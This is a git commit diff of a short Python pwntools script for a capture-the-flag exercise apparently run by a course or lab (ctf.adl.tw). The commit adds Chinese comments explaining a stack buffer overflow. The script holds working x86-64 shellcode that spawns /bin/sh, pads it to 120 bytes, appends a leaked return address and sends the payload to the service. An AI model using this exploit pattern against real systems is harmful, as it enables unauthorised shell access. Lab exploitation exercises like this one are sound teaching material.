70eb7f6cdf96b5842021a172dfeb2edfc19ff305
wuling31715 <wuling31715@gmail.com>
2020-04-15 00:35:36 +0800

    .

--- adl/example/main.py
+++ adl/example/main.py
@@ -4,12 +4,17 @@ ip = 'ctf.adl.tw'
 port = 11000
 r = remote(ip, port)
 
+# 對程式送出長度 > buffer 的字串，使其產生 overflow
 shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+# buffer = shellcode + ...
 shellcode += "a" * (120 - len(shellcode))
+# 若 buffer < shellcode，則必須使用其他攻擊方法
 
 address = r.recv()
 print("address: " + address)
 
+# 因為 overflow 部分會繼續被寫入記憶體，最終覆蓋到記憶體中的 return address
+# 當程式執行完畢 return 時會被導向 buffer 的記憶體位址，執行一開始植入的 shellcode
 shellcode += p64(int(address.decode(),16))
 
 r.send(shellcode)
